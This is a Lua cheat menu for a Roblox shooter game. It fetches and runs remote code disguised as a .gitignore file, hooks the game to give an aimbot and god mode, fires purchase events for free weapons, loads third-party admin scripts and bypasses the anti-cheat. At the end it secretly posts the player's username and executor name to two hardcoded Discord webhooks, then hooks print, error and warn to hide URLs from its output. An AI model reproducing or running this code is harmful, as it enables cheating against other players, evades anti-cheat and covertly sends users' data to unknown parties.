
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheMasterHacker2244/creditt/main/.gitignore"))()
local GUI = Mercury:Create{
    Name = "Home",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "https://github.com/RogueMasterGUI/VIP-GUI"
}

local Tab = GUI:Tab{
	Name = "Miscellaneous",
	Icon = "rbxassetid://6157200594"
}

Tab:Button{
	Name = "Spam Knife",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Spam knife enabled. Click E to start spam knife. Unequipped the knife to disable spam knife.",
	Duration = 8,
	Callback = function() end
}

                local mouse = game.Players.LocalPlayer:GetMouse()
                mouse.KeyDown:Connect(
                    function(key)
                        if key == "e" then
                            while true do
                                wait()
                                local env =
                                    getsenv(workspace[game.Players.LocalPlayer.Name].Knife.KnifeServer.KnifeClient)
                                env.TriggerWeapon(
                                    {
                                        AttackType = "KnifeThrow",
                                        ThrowCharge = 0.01
                                    }
                                )
                            end
                        end
                    end
                )
            end
}

Tab:Button{
	Name = "Aimbot",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "We recommend not using Spam Knife with aimbot! To disable aimbot click the Rejoin button, or rejoin.",
	Duration = 9,
	Callback = function() end
}
local n = game:GetService("\87\111\114\107\115\112\97\99\101").CurrentCamera local s = game:GetService("\80\108\97\121\101\114\115") local t = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local function m() local q = nil local r = math.huge for i, v in pairs(s.GetPlayers(s)) do if v ~= t and v.Character and v.Character.FindFirstChild(v.Character, "\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then local b = (t.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude if b < r then r = b q = v end end end if q then return q end end local j = getrawmetatable(game) local l = j.__namecall setreadonly(j, false) j.__namecall = newcclosure(function(object, ...) local o = getnamecallmethod() local h = {...} if tostring(o) == "\70\105\110\100\80\97\114\116\79\110\82\97\121\87\105\116\104\73\103\110\111\114\101\76\105\115\116" then local q = m() if q and q.Character then h[1] = Ray.new(n.CFrame.Position, (q.Character.Head.Position - n.CFrame.Position).Unit * (n.CFrame.Position - q.Character.Head.Position).Magnitude) end end return l(object, unpack(h)) end) setreadonly(j, true)
end
}

Tab:Button{
	Name = "God mode",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "God mode enabled. Use the *;re* command to remove god mode.",
	Duration = 6,
	Callback = function() end 
                
            }
function m() repeat wait() until (game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("\70\111\114\99\101\70\105\101\108\100")) local n = getsenv(game.Players.LocalPlayer.PlayerGui.GameUI.ClientMaster.ClientDamageMaster) n.EnvironmentDamage(game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character.Humanoid, -math.huge, "\75\105\108\108\69\102\102\101\99\116") end if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then m() end game.Players.LocalPlayer.CharacterAdded:connect(m)
end}

Tab:Button{
	Name = "Bad god mode",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Bad god mode enabled. Use the *;re* command to remove bad god mode.",
	Duration = 6.2,
	Callback = function() end 
                
            }
local m = game.Players.LocalPlayer while true do wait() if m.Character and m.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then game.Workspace[m.Character.Name].CollisionParts:Destroy() end end
end}

local Tab = GUI:Tab{
	Name = "Map",
	Icon = "rbxassetid://7199724739"
}

Tab:Button{
	Name = "Office [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Office")
end}

Tab:Button{
	Name = "Classic [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Classic")
end}

Tab:Button{
	Name = "Castle [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Castle")
end}

Tab:Button{
	Name = "Mountain Town [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("MountainTown")
end}

Tab:Toggle{
	Name = "Safe zone",
	StartingState = false,
	Description = nil,
	Callback = function(state) local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleported.",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3766.83447, 5.79891253, 2273.18896, 0.0215623733, -9.73389049e-08, -0.999767482, -6.42052385e-08, 1, -9.8746284e-08, 0.999767482, 6.63195152e-08, 0.0215623733)
end}

Tab:Toggle{
	Name = "Map TP [TP to someone]",
	StartingState = false,
	Description = nil,
	Callback = function(state) local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleported.",
	Duration = 2,
	Callback = function() end 
                
            }
local players = game.Players:GetChildren()

for index, players in pairs(players) do
local me = game.Players.LocalPlayer.Character
local player = players.Character.HumanoidRootPart
me.HumanoidRootPart.CFrame = CFrame.new(player.Position.X, player.Position.Y, player.Position.Z)
end
end}

local Tab = GUI:Tab{
	Name = "Gun & Knifes",
	Icon = "rbxassetid://7219199111"
}

Tab:Button{
	Name = "Death AWP [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\101\97\116\104\65\87\80")
end}

Tab:Button{
	Name = "Riot Shotgun [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\105\111\116\83\104\111\116\103\117\110")
end}

Tab:Button{
	Name = "Hellfire Shotguns [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui") 

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\72\101\108\108\102\105\114\101\83\104\111\116\103\117\110\115")
end}

Tab:Button{
	Name = "Korbloxberettas [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\75\111\114\98\108\111\120\66\101\114\101\116\116\97\115")
end}

Tab:Button{
	Name = "The Reaper [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\101\97\112\101\114\75\110\105\102\101")
end}

Tab:Button{
	Name = "Crescendo [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\67\114\101\115\99\101\110\100\111")
end}

Tab:Button{
	Name = "Dark Piecemaker [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\97\114\107\80\105\101\99\101\109\97\107\101\114")
end}

Tab:Button{
	Name = "Dragon Lore [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\114\97\103\111\110\76\111\114\101")
end}

Tab:Button{
	Name = "Eruption [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\69\114\117\112\116\105\111\110\75\110\105\102\101")
end}

Tab:Button{
	Name = "Overseer [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\79\118\101\114\115\101\101\114\75\110\105\102\101")
end}

local Tab = GUI:Tab{
	Name = "Script hub",
	Icon = "rbxassetid://6031075938"
}

Tab:Button{
	Name = "Infinite Yield",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
end}

Tab:Button{
	Name = "CMD-X",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end}

Tab:Button{
	Name = "Fates-Admin",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end}

Tab:Button{
	Name = "Owl-Hub",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end}

local Tab = GUI:Tab{
	Name = "Other fetures",
	Icon = "rbxassetid://7194280652"
}

Tab:Button{
	Name = "Join sandbox [GAMEMODE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Joining...",
	Duration = 2,
	Callback = function() end 
                
            }
    local n = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local k = game:GetService("\80\108\97\121\101\114\115").LocalPlayer n:Teleport(2598777798, k)
end}

Tab:Button{
	Name = "Serverhop",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Serverhoping...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = {} for _, v in ipairs(game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):JSONDecode(game:HttpGetAsync("\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47" .. game.PlaceId .. "\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48")).data) do if type(v) == "\116\97\98\108\101" and v.maxPlayers > v.playing and v.id ~= game.JobId then m[#m + 1] = v.id end end if #m > 0 then game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, m[math.random(1, #m)]) else return notify("\83\101\114\118\101\114\104\111\112","\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46") end
end}

Tab:Button{
	Name = "Rejoin",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Rejoing...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local n = game:GetService("\80\108\97\121\101\114\115").LocalPlayer m:Teleport(game.PlaceId, n)
end}

local CoreGui = game:GetService("StarterGui")



bypassantiCheat = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and self.Name == "Utility" and method == "FireServer" then
        print("Anti cheat blocked.")
        return; -- basically do nothing if it gets called
    end

    return bypassantiCheat(self, ...)
end)

GUI:Notification{
	Title = "Alert",
	Text = "Anti cheat bypassed loaded!",
	Duration = 2,
	Callback = function() end 
                
            }
local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"



local url =
"https://discord.com/api/webhooks/1007332482250723328/PiPdXlPa6O07bOzh6mBlu53JKaAgczeKJikSmXEtDvC2dAiJ_CZTy-vQkn98vp27qUCX"
local data = {
["content"] = "Detected user:",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name..". Exploit: **"..webhookcheck.."**"..". GUI: VIP",
["type"] = "rich",
["color"] = tonumber(0),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local h
h = hookfunction(warn,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
local url =
"https://discord.com/api/webhooks/1009239170331447367/PKHDN6NXGr85w3ldmKAmu3IsmQ8-5T2x0XuNE1CdapUSgwZBLZpFQdrQzGqe6fc-82lo"
local data = {
["content"] = "Detected user:",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**".." with VIP GUI",
["type"] = "rich",
["color"] = tonumber(0x7269da),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local h
h = hookfunction(warn,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
